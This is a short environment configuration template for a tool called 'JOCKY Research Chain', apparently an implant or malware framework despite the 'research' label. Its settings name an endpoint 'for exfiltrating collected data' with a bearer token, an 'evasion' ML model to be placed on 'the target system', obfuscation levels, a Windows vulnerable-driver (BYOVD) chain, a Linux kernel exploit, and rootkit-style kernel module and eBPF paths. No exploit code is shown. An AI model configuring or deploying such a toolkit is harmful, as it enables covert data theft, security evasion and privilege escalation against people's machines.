# JOCKY Research Chain Environment Configuration
# Copy this to .env.research and customize for your deployment

# === CDN Configuration ===
# CDN endpoint for exfiltrating collected data
JOCKY_CDN_ENDPOINT=https://10.0.2.2:8443/upload

# CDN authentication token (Bearer token)
# Should be unique per deployment for security
JOCKY_CDN_TOKEN=Bearer research_caddy_auth_token_v2_2024

# === AI/ML Configuration ===
# Path to the ML model for threat assessment
# The model file MUST be present at this path on the target system
# Download Phi-3 model: https://huggingface.co/microsoft/Phi-3-mini
JOCKY_MODEL_PATH=/opt/models/phi3_evasion.gguf

# === Runtime Configuration ===
# Maximum time (ms) for ML inference
JOCKY_MAX_INFERENCE_MS=100

# === Logging Configuration ===
# Log level: DEBUG, INFO, WARN, ERROR
JOCKY_LOG_LEVEL=INFO

# === Security Configuration ===
# Enable audit logging
JOCKY_AUDIT_ENABLED=true

# Obfuscation level: none, light, standard, aggressive
JOCKY_OBFUSCATION_LEVEL=standard

# === Platform-Specific (Windows) ===
# BYOVD driver chain timeout (ms)
JOCKY_DRIVER_TIMEOUT=5000

# === Platform-Specific (Linux) ===
# Kernel exploit timeout (ms)
JOCKY_KERNEL_TIMEOUT=10000

# Path to LKM modules (Linux only)
JOCKY_LKM_PATH=/lib/modules/custom/

# eBPF program directory (Linux only)
JOCKY_EBPF_PATH=/sys/kernel/debug/tracing/
